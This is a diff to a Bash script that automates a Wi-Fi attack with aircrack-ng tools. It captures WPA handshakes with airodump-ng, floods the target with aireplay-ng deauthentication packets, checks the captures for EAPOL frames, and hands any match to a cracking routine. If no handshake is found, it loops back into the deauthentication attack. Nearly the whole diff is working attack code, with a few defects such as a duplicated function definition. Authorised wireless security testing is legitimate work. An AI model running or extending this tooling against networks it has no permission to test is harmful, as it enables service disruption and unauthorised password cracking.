@@ -255,7 +255,7 @@ sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write 
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
 echo -e "\e[32mAttacking...\e[0m"
 sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
-captureMAC
+#captureMAC
 deauthAttack
 sudo airmon-ng stop $foo > /dev/null 2>&1
 sudo systemctl start NetworkManager > /dev/null 2>&1
@@ -689,17 +689,58 @@ check_cap_files() {
 
 
 deauthAttack () {
-#sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
+sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 captureMAC
-echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
-echo -e "\e[32mAttacking...\e[0m"
-#sudo aireplay-ng --deauth 50 -a $bssid -c $client $foo 
-#sudo aireplay-ng --deauth 50 --bssid --dmac $client $foo
-sudo aireplay-ng --deauth 100 -a $bssid -c $cleint $foo
-#captureMAC
+sudo aireplay-ng --deauth 50 --bssid $bssid --channel $channel $client $foo
+sudo aireplay-ng --deauth 100 -a $bssid -c $client $foo
+sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
 check_cap_files
-check_eapol_in_cap
  } 
+
+
+
+
+
+
+# Function to check if .cap files exist and verify EAPOL frames
+check_cap_files() {
+    # Clear the screen
+    #clear
+
+    # Check if any .cap files exist in the current directory
+    if ls *.cap &> /dev/null; then
+        # .cap files are present
+        echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"  # Green text
+        
+        # Loop through each .cap file to check for EAPOL frames
+        for cap_file in *.cap; do
+            echo -e "\nChecking $cap_file for EAPOL frames..."
+            if check_eapol_in_cap "$cap_file"; then
+                echo -e "\e[32m[EAPOL Found]\e[0m Proceeding with cracking."
+                crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
+                return 0  # Stop after finding a valid file with EAPOL
+            else
+                echo -e "\e[31m[EAPOL Not Found]\e[0m Skipping file."
+            fi
+        done
+        
+        # If no valid .cap files with EAPOL are found, exit
+        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured. Trying again...\e[0m"
+        deauthAttack
+    else
+        # No .cap files found
+        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"  # Red text
+        sleep 3
+        deauthAttack
+    fi
+}
+
+
+
+
+
+
+
 
 macChange() {
      ##### Display available options #####
